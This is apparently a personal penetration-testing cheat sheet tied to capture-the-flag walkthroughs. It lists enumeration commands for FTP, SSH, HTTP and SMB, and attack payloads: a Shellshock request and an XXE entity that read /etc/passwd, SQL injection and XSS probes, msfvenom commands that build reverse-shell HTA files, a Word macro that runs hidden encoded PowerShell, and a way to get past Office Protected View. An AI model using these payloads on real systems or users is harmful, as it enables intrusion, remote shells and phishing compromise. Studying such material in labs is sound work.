---
title: "Pentesting CheatSheet"
author: "Me"
date: "November 03, 2021"
output: html_document
---

# Attack vectors
{:.no_toc}

This "Cheatsheet" lists the various tools and techniques used in the writeups to get a foothold.

Here's the content so far:

1. TOC
{:toc}
{:style="color:black; font-size: 150%;"}

# 21 - FTP

- Is anonymous FTP allowed (user *anonymous*, blank password)?

````
sudo ftp targetip
`````
Example: <a href="/_walkthroughs/ServMon">ServMon</a>

- Known vulnerable versions: ProFTPD 1.3.3c, vsFTPd 2.3.4, ... -> Search for Metasploit exploits

# 22 - SSH

Rarely vulnerable, but often running on the target. Useful when we discover credentials, but can still use weak credentials such as root/root for example, so it's always worth trying.
There are 2 authentication methods:

- Username and password: the default username is "root", but often people create other users.

````
ssh username@ip_adress
`````
  
- SSH keys: more secure, it uses a pair of SSH keys. The server contains the public key, whereas the private key is on the target machine. If we can get the private key (id_rsa), the we can use it to connect via ssh. It might be necessary to change the file's permission first:

````
chmod 600 id_rsa
ssh -i id_rsa username@ip_adress
`````

# 80 - HTTP

## Enumeration (Directories, files, subdomains, ...)

- Headers 

````
curl -i targetIP            // If redirect (302), next command
curl -i -L targetIP         // Follows redirect, shows the raw code of the page
curl -s -L targetIP | grep "title\|href" | sed -e 's/^[[:space:]]*//'       // title tag
curl -s -L targetIP | html2text -width '99' | uniq                          // "renders" web page
`````


- Directories and files enumeration with **dirb** (-r for non recursive):

````
sudo dirb http://targetIP -r
``````

- Directories and files enumeration with **gobuster**:

````
sudo gobuster dir -u http://targetIP/ -w /usr/share/seclists/Discovery/Web_Content/common.txt -s '200,204,301,302,307,403,500' -e
sudo gobuster dir -u http://targetIP/ -w /usr/share/wordlists/...wordlist
sudo gobuster dir -u http://targetIP/ -w /usr/share/wordlists/...wordlist -x php # looks for php files
``````
Example: <a href="/_walkthroughs/BountyHunter">BountyHunter</a>

- Directories and files enumeration with **wpscan** (for Wordpress):

````
sudo wpscan --url targetIP # basic scan
sudo wpscan --url targetIP -e u # enumerate users
sudo wpscan --url targetIP -passwords file/path/passwords.txt # password attack
`````
Example: <a href="/_walkthroughs/basicpentest">Basic Pentesting: 1 (VulnHub)</a>

- Subdomains enumeration with **ffuf**:

````
sudo ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u http://targetIP/ -H "Host: FUZZ.targetIP"
`````
If the server returns a generic response for unexisting subdomains, this command can flood our terminal. If this is the case, and let's say all the false positives have a status of 200, the same size, number of words and lines, we can filter further to avoid displaying this noise. For example:

````
sudo ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u http://targetIP/ -H "Host: FUZZ.targetIP" -fs 3842 -fw 473 -fl 102
`````
The *f* stands for "filter" (fs filters the size, fw the words, and fs the lines).

Example: <a href="/_walkthroughs/Forge">Forge</a>

- Fuzzing with ffuf

Ffuf can also be used to fuzz a formular. Let's imagine we can enter 3 values in a form: first name, last name, and age. Instead of manually trying to inject things, we can use ffuf as follows:

````
sudo ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u http://targetIP/page_with_form -d "first_name=FUZZ&last_name=FUZZ&age=FUZZ" -X POST
`````
Obviously, the parameters must be the exact same as the ones that are used in the page. There are many ways to get their correct names: we can inspect the element (right click -> inspect), analyze the network tab in developer mode, or use Burp to intercept the request and analyze it. We can also directly use Burp's intruder functionality. 

- Web server enumeration with **nikto**:

````
sudo nikto -h targetIP
`````
Example: <a href="/_walkthroughs/knife">Knife</a>

- Check **wp_admin_shell_upload**. if the CMS is Wordpress
- Look for an administration console such as **phpmyadmin** (admin tool for MySQL databases) and try to log into it. Default credentials for phpmyadmin: "root" with a blank password. Use with Burp and potentially try brute forcing.
- Is the web server vulnerable to Shellschock (bug causing Bash to execute commands from environment variables unintentionally (gives RCE on the server to an attacker))? If it is the case (nikto should reveal it), we can send commands to the server through HTTP requests, and get them executed by the web server OS. POC HTTP request:
    
`````
GET http://shellshock.testsparker.com/cgi-bin/netsparker.cgi HTTP/1.1
User-Agent: Netsparker
Host: shellshock.testsparker.com
Referer: () { :;}; echo "NS:" $(</etc/passwd)
``````


## XXE Injection

Does the application parses XML? If yes, it might be vulnerable to XXE injection. PoC:

````
<?xml version="1.0"?>
<!DOCTYPE data [
<!ELEMENT data (#ANY)>
<!ENTITY file SYSTEM "file:///etc/passwd">
]>
<data>&file;</data>
`````

Example: <a href="/_walkthroughs/BountyHunter">BountyHunter</a>


## SQL Injection

Server-side vulnerability that targets the application's database.
Input strings (into every possible form of the app) that could trigger an error message. Examples:

````
admin' or 1=1;#
````

## XSS (cross-site scripting)

Client-side vulnerability that works by manipulating a vulnerable web site so that it returns malicious JavaScript to users. When the malicious code executes inside a victim's browser, the attacker can fully compromise their interaction with the application.

**Detection**: manually by submitting simple unique input into every entry point of the application, identifying every location where the submitted input is returned in HTTP responses, and testing each location individually to determine whether suitably crafted input can be used to execute arbitrary JavaScript. Example:

````
<script>alert('test')</script>
`````

**Attention**: *alert()* doesn't work on Chrome from version 92 onward. In this case, we can use *print()* instead.\\
Automatically by using Burp's web vulnerability scanner.

**Stored XSS**\\
The malicious script comes from the website's database. PoC: input <script>alert('test')</script> in a field, submit it and refresh the page. If the browser interprets it, it should open a JavaScript pop-up alert.

**Reflected XXS**\\
Same principle, but the script isn't stored in a database. Instead, it comes from the HTTP request. Example: if the site/application has a research field, it does an http GET request with an URL parameter (*https://www.insecure.com/search?q=keyboard*). PoC: https://www.insecure.com/search?q=<script>alert</script>. We can then send this link to someone. When he/she visits the URL, the script executes in the user's browser.

**DOM (Document Object Model) based XSS**\\
The vulnerability resides in the client-side code (not the server-side). It happens when an application contains some client-side JavaScript that processes data from an untrusted source in an unsafe way, usually by writing the data back to the DOM. Example:\\
*var search = document.getElementById('search').value;\\
var results = document.getElementById('results');\\
results.innerHTML = 'You searched for: ' + search;*\\
If we can control the value of the input field, we ca craft a malicious value that causes our own script to execute:\\
*You searched for: <img src=1 onerror='/* malicious code here */'>*.


## CSRF (cross-site request forgery)

Principle: do http requests as the victim. In other words, induce a victim user to perform actions they don't intend to do.

## SSRF (server-side request forgery)

The target application may have functionality for importing data from a URL, publishing data to a URL or otherwise reading data from a URL that can be tampered with. The attacker modifies the calls to this functionality by supplying a completely different URL or by manipulating how URLs are built (path traversal etc.).\ When the manipulated request goes to the server, the server-side code picks up the manipulated URL and tries to read data to the manipulated URL. By selecting target URLs the attacker may be able to read data from services that are not directly exposed on the internet. The attacker may also use this functionality to import untrusted data into code that expects to only read data from trusted sources, and as such circumvent input validation.

Example: <a href="/_walkthroughs/Forge">Forge</a>

## SSTI (server-side template injection)

Some web applications use template engines to dissociate the visual display (HTML, CSS, ...) from the application logic (PHP, python, ...). Those engines create templates in the application, which are a mix of "hard-coded" data (the page layout's code) and dynamic variables. When the application is used, the template engine repalces the variables stored in the template, transforms it into a web page (HTML) and sends it to the client.\\
An SSTI vulnerability arises when users inputs are directly passed in a template, and executed by the template engine.\\

Detection: as for XXS and SQLi, SSTI vulnerabilities can be discovered by fuzzing the application's fields.

Example: <a href="/_walkthroughs/Bolt">Bolt</a>

## Login Bruteforcing

## Directory traversal

Directory traversal (also known as file path traversal) is a web security vulnerability that allows an attacker to read arbitrary files on the server that is running an application. This might include application code and data, credentials for back-end systems, and sensitive operating system files. In some cases, an attacker might be able to write to arbitrary files on the server, allowing them to modify application data or behavior, and ultimately take full control of the server.

Example: <a href="/_walkthroughs/Seal">Seal</a>

# 139, 445 - SMB

- SMB (Server Message Block, protocol to share resources on Windows local networks) enumeration and null sessions. Base commands:

````
sudo nmblookup -A targetIP
sudo nbtscan targetIP
sudo smbclient -L targetIP
sudo smbmap -H targetIP
````

Those commands are automated by *enum4linux*:

`````
sudo /usr/share/enum4linux/enum4linux.pl <targetIP>
``````

Run all nmap's SMB vulnerability checks:

````
sudo nmap --script smb-vuln* <targetIP>
sudo nmap --script smb-enum-shares -p139,445 <targetIP>
`````

If any of those methods discovered an accessible share, we can connect to it with *smbclient*:

````
sudo smbclient "\\\\<targetIP>\<shareName>"
`````

Example: <a href="/_walkthroughs/Love">Love</a>


# Client-side attacks
Exploit weaknesses in client software instead of server software. Involves user interaction.\\
These attacks do not require direct or routable access to the victim's machine.

## HTML applications
A file with a _.hta_ (instead of _.html_) extension will be interpreted by internet explorer (therefore it only works for IE and Edge to some extent) as an HTML application. This file can be executed by the _mshta.exe_ program.\\
The purpose of HTML applications is to allow execution of applications directly from IE, rather than downloading and executing it. The _mshata_ program asks the user the permission to run the program.\\
We use _msfvenom_ to create a _hta_ payload (_evil.hta_):

````
sudo msfvenom -p windows/shell_reverse_tcp LHOST=<attacker_IP> LPORT=<port> -f hta-psh -o /var/www/html/evil.hta
`````
By inspecting the file, we see the payload is based on PowerShell.
We start a web server and a listener on Kali and browse to it from the victim machine.

## Microsoft Office
The use of malicious macros in Miscrosoft Office is a well-known client-side attack vector. Macros can be written in VBA (Visual Basic for Applications).\\
The main procedure in VBA starts with *Sub*, and ends with *End Sub*. As for HTMP applications, we generate a PowerShell payload with _msfvenom_:

````
sudo msfvenom -p windows/shell_reverse_tcp LHOST=<attacker_IP> LPORT=<port> -f hta-psh -o evil.hta
`````
The payload itself is found within the _.hta_ file. However, we can't simply paste it in a macro because VBA has a 255-character limit for strings.
The original base64 command can be split with the following python script:

````
str = "powershell.exe -nop -w hidden -e JABzACAAPQAgAE4AZQB3AC....."
n = 50
for i in range(0, len(str), n):
    print "Str = Str + " + '"' + str[i:i+n] + '"'
`````

Then, it can be included in the macro (Warning: use either _.docm_ or _.doc_ to save the document, and not _.docx_ since it doesn't support embedded macros).
On Word, open View > Macro > change the value in the drop-down menu to the name of the document the macro will be inserted into. Finally, create the macro:

````
Sub AutoOpen()
    MyMacro
End Sub

Sub Document_Open()
    MyMacro
End Sub

Sub MyMacro()
    Dim Str As String
    Str = "powershell.exe -nop -w hidden -e JABzACAAPQAgAE4AZ"
    Str = Str + "QB3AC0ATwBiAGoAZQBjAHQAIABJAE8ALgBNAGUAbQBvAHIAeQB"
    Str = Str + "TAHQAcgBlAGEAbQAoACwAWwBDAG8AbgB2AGUAcgB0AF0AOgA6A"
    Str = Str + "EYAcgBvAG0AQgBhAHMAZQA2ADQAUwB0AHIAaQBuAGcAKAAnAEg"
    Str = Str + "ANABzAEkAQQBBAEEAQQBBAEEAQQBFAEEATAAxAFgANgAyACsAY"
    Str = Str + "gBTAEIARAAvAG4ARQBqADUASAAvAGgAZwBDAFoAQwBJAFoAUgB"
    ...
    Str = Str + "AZQBzAHMAaQBvAG4ATQBvAGQAZQBdADoAOgBEAGUAYwBvAG0Ac"
    Str = Str + "AByAGUAcwBzACkADQAKACQAcwB0AHIAZQBhAG0AIAA9ACAATgB"
    Str = Str + "lAHcALQBPAGIAagBlAGMAdAAgAEkATwAuAFMAdAByAGUAYQBtA"
    Str = Str + "FIAZQBhAGQAZQByACgAJABnAHoAaQBwACkADQAKAGkAZQB4ACA"
    Str = Str + "AJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAVABvAEUAbgBkACgAK"
    Str = Str + "QA="
    Shell (Str)
End Sub
````
We can open a netcat listener on Kali and wait for the victim to open and run the macro.


## Object linking and embedding
...

## Other Office applications (Publisher) - Evading Protected View
In the previous techniques, if the document is sent in an email or as a download link over the internet, it will not be executed because of Protected View, another layer of protection. Even though the user could enable editing and thus run the malicious document, but this is not very likely. This mechanism can be avoided by using other Microsoft Office applications, such as Publisher. It works the same way as Word or Excel. The downside is that it is less frequently installed.

